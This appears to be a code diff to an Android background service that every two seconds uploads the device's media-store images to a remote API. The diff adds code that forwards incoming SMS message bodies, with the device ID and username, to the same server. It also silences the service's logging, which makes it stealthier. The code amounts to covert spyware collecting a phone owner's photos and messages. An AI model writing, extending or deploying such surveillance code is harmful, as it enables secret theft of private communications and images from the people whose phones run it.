@@ -7,12 +7,17 @@ package org.jesusgift.clienttest;
  * */
 
 import android.app.Service;
+import android.content.BroadcastReceiver;
+import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.os.AsyncTask;
+import android.os.Bundle;
 import android.os.IBinder;
+import android.provider.Telephony;
 import android.support.annotation.Nullable;
+import android.telephony.SmsMessage;
 import android.util.Log;
 
 import org.jesusgift.clienttest.Helpers.AppConfig;
@@ -31,7 +36,6 @@ import java.util.TimerTask;
 import okhttp3.MediaType;
 import okhttp3.OkHttpClient;
 import okhttp3.RequestBody;
-import okhttp3.logging.HttpLoggingInterceptor;
 import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Response;
@@ -48,7 +52,8 @@ public class ClientService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.i(TAG, "Service Started");
+        AppConfig.IS_SERVICE_RUNNING = true;
+        //Log.i(TAG, "Service Started");
 
         //Initialising Database
         dbManager = new DBManager(this, null, null, AppConfig.DB_VERSION);
@@ -57,15 +62,21 @@ public class ClientService extends Service {
         initTimer();
     }
 
+    /**
+     * Initialising Timer Controls
+     * */
     private void initTimer() {
         timer = new Timer();
         timer.scheduleAtFixedRate(timerTask, 0, 2000);
     }
 
+    /**
+     * Timer Task to Check for Data
+     * */
     private TimerTask timerTask = new TimerTask() {
         @Override
         public void run() {
-            Log.d(TAG, "SERVICE RUNNING");
+            Log.d(TAG, "Service Running");
             if(MyUtility.isOnline(ClientService.this)) {
                 if(READY_TO_RUN) {
                     processMediaStore();
@@ -74,6 +85,9 @@ public class ClientService extends Service {
         }
     };
 
+    /**
+     * Function Bloack to process media store
+     * */
     private void processMediaStore() {
         final MediaType TYPE_IMAGE = MediaType.parse("image/*");
         Map<String, RequestBody> reqMap = new HashMap<>();
@@ -98,7 +112,7 @@ public class ClientService extends Service {
                             }
                         }
                     } else {
-                        Log.i(TAG, "MEDIA " + c.getString(0) + " ALREADY UPLOADED!");
+                        //Log.i(TAG, "MEDIA " + c.getString(0) + " ALREADY UPLOADED!");
                     }
                 }
 
@@ -115,15 +129,8 @@ public class ClientService extends Service {
      * Function to initialise Retrofit services
      * */
     private void initRetrofitService() {
-        HttpLoggingInterceptor logging = new HttpLoggingInterceptor();
-        logging.setLevel(HttpLoggingInterceptor.Level.BASIC);
-        OkHttpClient client = new OkHttpClient.Builder()
-                .addInterceptor(logging)
-                .build();
-
         retrofit = new Retrofit.Builder()
                 .baseUrl(AppConfig.API_BASE_URL)
-                .client(client)
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
     }
@@ -161,7 +168,7 @@ public class ClientService extends Service {
     Callback<ApiResponse> apiCallback = new Callback<ApiResponse>() {
         @Override
         public void onResponse(Call<ApiResponse> call, Response<ApiResponse> response) {
-            Log.i(TAG, "SUC : "+response.code());
+            //Log.i(TAG, "SUC : "+response.code());
             if(response.code() == 200){
                 if(dbManager.insertMedia(response.body().getData())) {
                     MyUtility.clearCacheDir(getCacheDir());
@@ -172,29 +179,58 @@ public class ClientService extends Service {
 
         @Override
         public void onFailure(Call<ApiResponse> call, Throwable t) {
-            Log.e(TAG,"ERR : "+t.getMessage());
+            //Log.e(TAG,"ERR : "+t.getMessage());
         }
     };
 
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.i(TAG, "on Service Start Command");
-        return START_STICKY;
 
+    /**
+     * Background Async Task for Posting SMS
+     * */
+    public class SmsTask extends AsyncTask<String, Void, Void> {
+
+        @Override
+        protected Void doInBackground(String... params) {
+            String sms = params[0];
+            ApiService apiService = retrofit.create(ApiService.class);
+            Call<ApiResponse> res = apiService.postSms(sms, MyUtility.getDeviceId(ClientService.this), MyUtility.getUsername(ClientService.this));
+            res.enqueue(apiCallback);
+            return null;
+        }
     }
 
+    /**
+     * Client Service On Start Command
+     * */
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        Bundle extras = intent.getExtras();
+        if(extras != null) {
+            if(extras.containsKey(AppConfig.MESSAGE_BODY)){
+                String msg = intent.getExtras().getString(AppConfig.MESSAGE_BODY);
+                new SmsTask().execute(msg);
+            }
+        }
+        return START_STICKY;
+    }
+
+    /**
+     * Client Service On Destroy
+     * */
     @Override
     public void onDestroy() {
         super.onDestroy();
-        Log.i(TAG, "Service Destroyed");
         timer.cancel();
+        AppConfig.IS_SERVICE_RUNNING = false;
 
         Intent intent = new Intent();
         intent.setAction(AppConfig.SERVICE_STOP_BROADCAST);
         sendBroadcast(intent);
     }
 
-
+    /**
+     * Client Service Activity Binder
+     * */
     @Nullable
     @Override
     public IBinder onBind(Intent intent) {
